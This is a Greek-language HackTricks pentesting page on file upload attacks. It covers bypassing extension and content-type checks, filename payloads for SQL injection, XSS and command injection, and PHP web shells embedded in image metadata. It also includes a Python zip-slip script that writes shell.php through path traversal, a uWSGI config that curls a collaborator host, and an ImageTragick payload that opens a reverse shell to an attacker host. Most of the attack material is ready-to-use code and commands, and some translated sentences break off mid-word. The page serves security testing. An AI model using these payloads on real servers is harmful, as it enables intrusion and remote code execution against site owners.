# Μεταφόρτωση Αρχείων

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Συμβουλή για bug bounty**: **εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty που δημιουργήθηκε από χάκερς, για χάκερς**! Γίνετε μέλος μας στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Γενική Μεθοδολογία Μεταφόρτωσης Αρχείων

Άλλες χρήσιμες επεκτάσεις:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Λειτουργία στο PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Παράκαμψη ελέγχων επεκτάσεων αρχείων

1. Εάν ισχύουν, **ελέγξτε** τις **προηγούμενες επεκτάσεις**. Δοκιμάστε τις χρησιμοποιώντας κάποια **κεφαλαία γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Ελέγξτε **προσθέτοντας μια έγκυρη επέκταση πριν** την εκτελέσιμη επέκταση (χρησιμοποιήστε επίσης τις προηγούμενες επεκτάσεις):_
* _file.png.php_
* _file.png.Php5_
3. Δοκιμάστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος**. Μπορείτε να χρησιμοποιήσετε το Burp για να **δοκιμάσετε όλους τους αριθμούς ASCII** και **Unicode**. (_Σημείωση ότι μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγούμενες** αναφερθείσες **επεκτάσεις**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Δοκιμάστε να παρακάμψετε τις προστασίες **παραπλανώντας τον αναλυτή επέκτασης** της εξυπηρετούμενης πλευράς με τεχνικές όπως η **διπλασιασμένη επέκταση** ή η **προσθήκη αχρήστων** δεδομένων (**μηδενικά** bytes) μεταξύ των επεκτάσεων. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να προετοιμάσετε ένα καλύτερο φορτίο._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Προσθέστε **έναν ακόμα επίπεδο επεκτάσεων** στον προηγούμενο έλεγχο:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Δοκιμάστε να τοποθετήσετε την **εκτελέσιμη επέκταση πριν από την έγκυρη ε
### Παράκαμψη Content-Type, Magic Number, Συμπίεση & Αλλαγή Μεγέθους

* Παράκαμψη των ελέγχων **Content-Type** θέτοντας την **τιμή** του **header Content-Type** σε: _image/png_, _text/plain_, application/octet-stream_
1. Λίστα λέξεων για το **Content-Type**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Παράκαμψη του ελέγχου του **magic number** προσθέτοντας στην αρχή του αρχείου τα **bytes ενός πραγματικού εικόνας** (για να μπερδέψετε την εντολή _file_). Ή εισαγάγετε το shell μέσα στα **μεταδεδομένα**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ή μπορείτε επίσης να **εισαγάγετε το payload απευθείας** σε μια εικόνα:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Εάν προστίθεται **συμπίεση** στην εικόνα σας, για παράδειγμα χρησιμοποιώντας κάποιες κοινές βιβλιοθήκες PHP όπως η [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές δεν θα είναι χρήσιμες. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **PLTE chunk** [**τεχνική που καθορίζεται εδώ**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισαγάγετε κείμενο που θα **επιβιώσει της συμπίεσης**.
* [**Github με τον κώδικα**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Η ιστοσελίδα μπορεί επίσης να **αλλάζει το μέγεθος της εικόνας**, χρησιμοποιώντας για παράδειγμα τις συναρτήσεις PHP-GD `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **IDAT chunk** [**τεχνική που καθορίζεται εδώ**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισαγάγετε κείμενο που θα **επιβιώσει της συμπίεσης**.
* [**Github με τον κώδικα**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Μια άλλη τεχνική για να δημιουργήσετε ένα payload που **επιβιώνει από την αλλαγή μεγέθους της εικόνας**, χρησιμοποιώντας τη συνάρτηση PHP-GD `thumbnailImage`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **tEXt chunk** [**τεχνική που καθορίζεται εδώ**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισαγάγετε κείμενο που θα **επιβιώσει της συμπίεσης**.
* [**Github με τον κώδικα**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Άλλα κόλπα για έλεγχο

* Βρείτε μια ευπάθεια για να **μετονομάσετε** το ήδη ανεβασμένο αρχείο (για να αλλάξετε την επέκταση).
* Βρείτε μια ευπάθεια **Τοπικής Συμπερίληψης Αρχείου** για να εκτελέσετε την πίσω πόρτα.
* **Πιθανή αποκάλυψη πληροφοριών**:
1. Μεταφόρτωση **πολλαπλών φορών** (και ταυτόχρονα) του **ίδιου αρχείου** με το **ίδιο όνομα**
2. Μεταφόρτωση ενός αρχείου με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Μεταφόρτωση ενός αρχείου με το **“.”, “..”, ή “…” ως όνομά του**. Για παράδειγμα, στον Apache σε **Windows**, εάν η εφαρμογή αποθηκεύει τα μεταφορτωμένα αρχεία στον κατάλογο “/www/uploads/”, το όνομα “.” θα δημιουργήσει ένα αρχείο με το όνομα “uploads” στον κατάλογο “/www/”.
4. Μεταφόρτωση ενός αρχείου που δεν μπορεί να διαγραφεί εύκολα, όπως το **“…:.jpg”** στο **NTFS**. (Windows)
5. Μεταφόρτωση ενός αρχείου στα **Windows** με **μη έγκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Μεταφόρτωση ενός αρχείου στα **Windows** χρησιμοποιώντας **απαγορευμένα ονόματα** (**απαγορευμένα ονόματα**) όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 και LPT9.
* Δοκιμάστε επίσης να **μεταφορτώσετε ένα εκτελέσιμο** (.exe) ή ένα **.html**
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload γίνεται κατά τη διάρκεια της ανάλυσης του αρχείου ρυθμίσεων. Για να ενεργοποιηθεί και να αναλυθεί η ρύθμιση, η διεργασία uWSGI πρέπει είτε να επανεκκινηθεί (πιθανώς μετά από κατάρρευση ή λόγω επίθεσης DoS) είτε το αρχείο πρέπει να οριστεί για αυτόματη επαναφόρτωση. Η λειτουργία αυτόματης επαναφόρτωσης, εάν είναι ενεργοποιημένη, επαναφορτώνει το αρχείο σε καθορισμένα διαστήματα αφού ανιχνεύσει αλλαγές.

Είναι κρίσιμο να κατανοήσετε την ανεπίσημη φύση της ανάλυσης του αρχείου ρυθμίσεων του uWSGI. Συγκεκριμένα, το συζητούμενο payload μπορεί να εισαχθεί σε ένα δυαδικό αρχείο (όπως εικόνα ή PDF), διευρύνοντας περαιτέρω το πεδίο της δυνητικής εκμετάλλευσης.

## **Κόλπος αποστολής αρχείου/SSRF με τη χρήση του wget**

Σε ορισμένες περιπτώσεις μπορεί να αντιληφθείτε ότι ένας διακομιστής χρησιμοποιεί το **`wget`** για να **κατεβάσει αρχεία** και μπορείτε να **υποδείξετε** το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι η επέκταση των κατεβασμένων αρχείων βρίσκεται εντός μιας λευκής λίστας για να διασφαλιστεί ότι θα κατεβαστούν μόνο επιτρεπόμενα αρχεία. Ωστόσο, **αυτός ο έλεγχος μπορεί να παρακαμφθεί**.\
Το **μέγιστο** μήκος ενός **ονόματος αρχείου** στο **Linux** είναι **255**, ωστόσο, το `wget` περικόπτει τα ονόματα αρχείων σε **236** χαρακτήρες. Μπορείτε να **κατεβάσετε ένα αρχείο με το όνομα "A"\*232+".php"+".gif"**, αυτό το όνομα αρχείου θα **παρακάμψει** τον **έλεγχο** (όπως σε αυτό το παράδειγμα το **".gif"** είναι μια **έγκυρη** επέκταση) αλλά το `wget` θα **μετονομάσει** το αρχείο σε **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Σημειώστε ότι **μια άλλη επιλογή** που μπορείτε να σκεφτείτε για να παρακάμψετε αυτόν τον έλεγχο είναι να κάνετε τον **HTTP server να ανακατευθύνει σε ένα διαφορετικό αρχείο**, έτσι το αρχικό URL θα παρακάμψει τον έλεγχο και τότε το wget θα κατεβάσει το ανακατευθυνόμενο αρχείο με το νέο όνομα. Αυτό **δεν θα λειτουργήσει** **εκτός αν** το wget χρησιμοποιείται με τη **παράμετρο** `--trust-server-names` επειδή το wget θα κατεβάσει την ανακατευθυνόμενη σελίδα με το όνομα του αρχείου που δηλώνεται στο αρχικό URL.

## Εργαλεία

* Το [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) είναι ένα ισχυρό εργαλείο που σχεδιάστηκε για να βοηθήσει τους Pentesters και τους Bug Hunters στον έλεγχο των μηχανισμών αποστολής αρχείων. Χρησιμοποιεί διάφορες τεχνικές ανταμοιβής ευρημάτων για να απλοποιήσει τη διαδικασία εντοπισμού και εκμετάλλευσης ευπαθειών, εξασφαλίζοντας έτσι πλήρεις αξιολογήσεις των web εφαρμογών.

## Από την αποστολή αρχείων σε άλλες ευπάθειες

* Ορίστε το **όνομα αρχείου** σε `../../../tmp/lol.png` και προσπαθήστε να επιτύχετε μια **διαδρομή διάβασης**
* Ορίστε το **όνομα αρχείου** σε `sleep(10)-- -.jpg` και μπορεί να επιτύχετε μια **ενέστικτη SQL**
* Ορίστε το **όνομα αρχείου** σε `<svg onload=alert(document.domain)>` για να επιτύχετε ένα XSS
* Ορίστε το **όνομα αρχείου** σε `; sleep 10;` για να δοκιμάσετε μερικές εντολές εισαγωγής (περισσότερα [κόλπα εισαγωγής εντολών εδώ](../command-injection.md))
* [**XSS** σε αποστολή εικόνας (svg) αρχείου](../xss-cross-site-scripting/#xss-uploading-files-svg)
* Αποστολή αρχείου **JS** + **XSS** = [Εκμετάλλευση **Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE σε αποστολή svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Ανακατεύθυνση ανοιχτής πρόσβασης** μέσω αποστολής αρχείου svg](../open-redirect.md#open-redirect-uploading-svg-files)
* Δοκιμάστε **διάφορα φορτία svg** από το [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Διάσημη ευπάθεια **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Εάν μπορείτε να **υποδείξετε στον web server να προσπαθήσει να προσπελάσει μια εικόνα από μια διεύθυνση URL**, μπορείτε να δοκιμάσετε να καταχραστείτε ένα [SSRF](../ssrf-server-side-request-forgery/). Εάν αυτή η **εικόνα** πρόκειται να **αποθηκευτεί** σε κάποιο **δημόσιο** site, μπορείτε επίσης να υποδείξετε μια διεύθυνση URL από το [https://iplogger.org/invisible/](https://iplogger.org/invisible/) και να **κλέψετε πληροφορίες από κάθε επισκέπτη**.
* [**XXE και CORS** παράκαμψη με αποστολή PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* Ειδικά διαμορφωμένα PDF για XSS: Η [ακόλουθη σελίδα παρουσιάζει πώς να **εισαγάγετε δεδομένα PDF για να εκτελέσετε JS**](../xss-cross-site-scripting/pdf-injection.md). Εάν μπορείτε να αποστείλετε PDF, μπορείτε να προετοιμάσετε ένα PDF που θα εκτελεί αυθαίρετο JS ακολουθώντας τις δοθείσες οδηγίες.
* Αποστείλετε το περιεχόμενο \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) για να ελέγξετε εάν ο διακομιστής έχει κάποιο **αντιιικό**.
* Ελέγξτε εάν υπάρχει κάποιο **όριο μεγέθους** για τη μεταφόρτωση αρχείων

Εδώ υπάρχει μια λίστα με τα 10 κορυφαία πράγματα που μπορείτε να επιτύχετε με τη μεταφόρτωση (από [εδώ](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Αποθηκευμένο XSS / SSRF / XXE
3. **GIF**: Αποθηκευμένο XSS / SSRF
4. **CSV**: Εισαγωγή CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : Εισαγωγή HTML / XSS / Ανοιχτή ανακατεύθυνση
8. **PNG / JPEG**: Επίθεση πλημμύρας pixel (DoS)
9. **ZIP**: RCE μέσω LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Επέκταση Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Μαγικά Bytes Κεφαλίδας

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Ανατρέξτε στο [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) για άλλους τύπους αρχείων.

### Αυτόματη αποσυμπίεση αρχείου Zip/Tar

Εάν μπορείτε να αποστείλετε ένα ZIP που θα αποσυμπιέζεται μέσα στον διακομιστή, μπορείτε να κάνετε 2 πράγματα:

#### Σύνδεσμος συμβολικού συνδέσμου

Αποστείλετε έναν σύνδεσμο που περιέχει μαλακούς συνδέσμους προς άλλα αρχεία, και στη συνέχεια, αποκτώντας πρόσβαση στ
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Αποσυμπίεση σε διάφορους φακέλους

Η απρόβλεπτη δημιουργία αρχείων σε φακέλους κατά την αποσυμπίεση αποτελεί ένα σημαντικό πρόβλημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να προστατεύσει από εκτέλεση εντολών σε επίπεδο λειτουργικού συστήματος μέσω κακόβουλων αποστολών αρχείων, η υποστήριξη ιεραρχικής συμπίεσης και οι δυνατότητες διάβασης φακέλων του αρχείου ZIP μπορούν να εκμεταλλευτούν. Αυτό επιτρέπει στους επιτιθέμενους να παρακάμψουν περιορισμούς και να δραπετεύσουν από ασφαλείς φακέλους αποστολής με την παραπλάνηση της λειτουργικότητας αποσυμπίεσης της επιθετικής εφαρμογής.

Ένα αυτοματοποιημένο εργαλείο εκμετάλλευσης για τη δημιουργία τέτοιων αρχείων είναι διαθέσιμο στο [**evilarc στο GitHub**](https://github.com/ptoomey3/evilarc). Το εργαλείο μπορεί να χρησιμοποιηθεί ως εξής:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, η **συνδεσμολογική απάτη με το evilarc** είναι μια επιλογή. Εάν το στόχος είναι να επιτεθείτε σε ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργηθεί ένας σύνδεσμος σε αυτό το αρχείο στο σύστημά σας. Αυτό εξασφαλίζει ότι το evilarc δεν θα αντιμετωπίσει σφάλματα κατά τη λειτουργία του.

Παρακάτω παρουσιάζεται ένα παράδειγμα κώδικα Python που χρησιμοποιείται για τη δημιουργία ενός κακόβουλου αρχείου zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Κατάχρηση συμπίεσης για τον ψεκασμό αρχείων**

Για περισσότερες λεπτομέρειες **ελέγξτε την αρχική ανάρτηση στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **Δημιουργία PHP Shell**:
Γράφεται κώδικας PHP για να εκτελεί εντολές που περνούν μέσω της μεταβλητής `$_REQUEST`.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **Ψεκασμός Αρχείων και Δημιουργία Συμπιεσμένου Αρχείου**:
Δημιουργούνται πολλαπλά αρχεία και συναρμολογείται ένα αρχείο zip που περιέχει αυτά τα αρχεία.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Τροποποίηση με Hex Editor ή vi**:
Τα ονόματα των αρχείων μέσα στο zip τροποποιούνται χρησιμοποιώντας το vi ή έναν hex editor, αλλάζοντας το "xxA" σε "../" για να διασχίσουν καταλόγους.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Μεταφορτώστε αυτό το περιεχόμενο με μια επέκταση εικόνας για να εκμεταλλευτείτε την ευπάθεια **(ImageMagick, 7.0.1-1)**
(από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP Shell σε PNG

Η ενσωμάτωση ενός PHP shell στο IDAT κομμάτι ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από το PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συχνά για την αλλαγή μεγέθους και την αναδειγματοληψία εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανέπαφο από αυτές τις λειτουργίες είναι ένα σημαντικό πλεονέκτημα για ορισμένες περιπτώσεις χρήσης.

Μια λεπτομερής εξερεύνηση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των δυνητικών εφαρμογών της, παρέχεται στο παρακάτω άρθρο: ["Κωδικοποίηση Web Shells σε PNG IDAT κομμάτια"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Αυτός ο πόρος προσφέρει μια συνολική κατανόηση της διαδικασίας και των επιπτώσεών της.

Περισσότερες πληροφορίες στο: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Πολυγλωττικά Αρχεία

Τα πολυγλωττικά αρχεία λειτουργούν ως ένα μοναδικό εργαλείο στην κυβερνοασφάλεια, λειτουργώντας ως χαμαιλέοντες που μπορούν να υπάρχουν έγκυρα σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι το [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα υβρίδιο που λειτουργεί τόσο ως GIF όσο και ως αρχείο RAR. Τέτοια αρχεία δεν περιορίζονται σε αυτήν τη συνδυασμένη μορφή. Είναι εφικτοί και συνδυασμοί όπως GIF και JS ή PPT και JS.

Η βασική χρησιμότητα των πολυγλωττικών αρχείων έγκειται στη δυνατότητά τους να παρακάμπτουν τα μέτρα ασφαλείας που ελέγχουν τα αρχεία με βάση τον τύπο. Η κοινή πρακτική σε διάφορες εφαρμογές περιλαμβάνει την επιτροπή μόνο συγκεκριμένων τύπων αρχείων για μεταφόρτωση, όπως JPEG, GIF ή DOC, για τη μείωση του κινδύνου από πιθανά επιβλαβή μορφότυπα (π.χ. JS, PHP ή Phar αρχεία). Ωστόσο, ένα πολυγλωττικό αρχείο, συμμορφούμενο με τα δομικά κριτήρια πολλαπλών τύπων αρχείων, μπορεί να παρακάμψει απαρατήρητα αυτούς τους περιορισμούς.

Παρά την προσαρμοστικότητά τους, τα πολυγλωττικά αρχεία αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα πολυγλωττικό αρχείο μπορεί να συνδυάζει ένα αρχείο PHAR (PHp ARchive) και ένα JPEG, η επιτυχία της μεταφόρτωσής του μπορεί να εξαρτάται από τις πολιτικές των επεκτάσεων αρχείων της πλατφόρμας. Εάν το σύστημα είναι αυστηρό όσον αφορά τις επιτρεπόμενες επεκτάσεις, η απλή δομική διπλότητα ενός πολυγλωττικού αρχείου μπορεί να μην είναι αρκετή για να εγγυηθεί τη μεταφόρτωσή του.

Περισσότερες πληροφορίες στο: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Αναφορές

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Συμβουλή για bug bounty**: **Εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty που δημιουργήθηκε από χάκερ, για χάκερ**! Γίνετε μέλος στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktr
